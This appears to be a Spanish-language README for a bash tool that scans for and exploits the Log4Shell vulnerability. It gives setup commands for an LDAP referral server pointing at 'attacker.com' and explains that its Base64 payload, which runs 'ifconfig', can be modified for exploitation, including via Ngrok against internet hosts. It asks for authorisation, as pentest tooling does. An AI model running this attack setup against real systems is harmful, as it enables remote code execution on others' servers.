# Log4Shell-Scanner-Exploit
Script en bash que permite identificar y/o explotar la vulnerabilidad Log4shell de forma remota.
Esta herramienta realiza distintas pruebas usando LDAP payloads y cabeceras X-Api-Version, User-Agent y X-Forwarded-For.

# Siempre utilizar este script con autorización previa del propietario del servicio/aplicación auditada.

# Dependencias:

1. Crearemos un servidor LDAP preconfigurado desde Github: https://github.com/mbechler/marshalsec
mvn clean package -DskipTests && Java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar 
marshalsec.jndi.LDAPRefServer 'http://attacker.com/#exploit'

2. Habilitamos un servidor HTTP 
python3 -m http.server 8080

3. Tener Java instalado
#sudo apt install default-jre

4. tener Curl instalado
#sudo apt-get install curl


# Ejemplo de uso:

Ingresar los siguientes parámetros:
*	Lista de URLs a escanear
*	Dirección IP del servidor LDAP
*	Puerto servidor LDAP
*	Dirección IP servidor HTTP
*	Puerto servidor HTTP

#Ejemplo escaneo de aplicación en red interna: 
* ./Log4Shell_Scanner.sh <Diccionario_URL> <IP_Servidor_LDAP> <Puerto_Servidor_LDAP> <IP_Servidor_HTTP> <Puerto_Servidor_HTTP>

![image](https://user-images.githubusercontent.com/26369589/146909267-14d15a5a-f9fe-4000-b807-7f7a946d6d6d.png)

#Ejemplo escaneo de aplicación en internet:
* ./Log4Shell_Scanner.sh <Diccionario_URL> <IP_Servidor_LDAP> <Puerto_Servidor_LDAP> <IP_Servidor_HTTP> <Puerto_Servidor_HTTP>

![image](https://user-images.githubusercontent.com/26369589/146910362-56b89fee-6d5a-44c7-a2d9-d5ad65853ae3.png)


# Aclaraciones:

* El payload utilizado envía un comando "ifconfig" a las máquinas identificadas como vulnerables, este payload esta codificado en Base64 y puede ser modificado para realizar la fase de explotación en una auditoría de pentesting.
* Si se desea utilizar la herramienta en servicios de internet se puede iniciar un servicio de Ngrok que haga un port forwarding al puerto local del Servidor LDAP
* Siempre utilizar este script con autorización previa del propietario del servicio/aplicación analizada.
